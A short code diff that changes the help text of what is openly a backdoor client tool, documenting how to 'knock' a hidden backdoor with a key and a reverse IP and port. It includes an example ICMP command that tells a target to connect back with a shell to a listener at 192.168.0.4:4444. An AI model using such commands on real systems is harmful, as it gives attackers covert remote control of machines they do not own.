@@ -142,7 +142,7 @@ void usage(char *argv){
 	printf("-t\tTarget IP address\n");
 	printf("-p\tSource Port\n");
 	printf("-q\tTarget Port\n");
-	printf("-d\tData to knock on backdoor\n");
+	printf("-d\tData to knock on backdoor: \"<key> <reverse IP> <reverse Port>\"\n");
 	printf("-l\tLaunch listener\n\n");
 	printf("%s ICMP doesn't need ports\n\n", warn);
 	printf("ICMP: %s -x icmp -s 192.168.0.2 -t 192.168.0.3 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
